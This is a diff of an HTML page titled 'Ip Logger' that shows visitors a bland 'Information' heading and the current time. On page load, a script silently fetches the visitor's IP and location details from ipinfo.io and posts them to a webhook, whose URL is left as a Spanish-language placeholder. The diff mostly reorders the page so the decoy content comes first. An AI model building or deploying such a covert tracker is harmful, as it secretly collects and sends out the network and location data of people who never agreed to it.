@@ -4,8 +4,18 @@
 	<meta charset="utf-8">
 	<title>Ip Logger</title>
 	<link type="text/css" rel="stylesheet" href="style.css">
+</head>
+<body>
+	<center>
+		<h1>Information</h1>
+		<input type="color"></input>
+		<p>Actual time: <span id="here"></span></p>
+	</center>
 	<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 	<script>
+		const date = new Date();
+		document.getElementById('here').innerHTML = date;
+		
 		$.get("https://ipinfo.io", function(response) {
 			const webhook_url = "AQUI LA URL DE EL WEBHOOK";
 			const main = {
@@ -73,17 +83,6 @@
 				'embeds': [main],
 			}));
 		}, "json");
-	</script>
-</head>
-<body>
-	<center>
-		<h1>Information</h1>
-		<input type="color"></input>
-		<p>Actual time: <span id="here"></span></p>
-	</center>
-	<script>
-		const date = new Date();
-		document.getElementById('here').innerHTML = date;
 	</script>
 </body>
 </html>
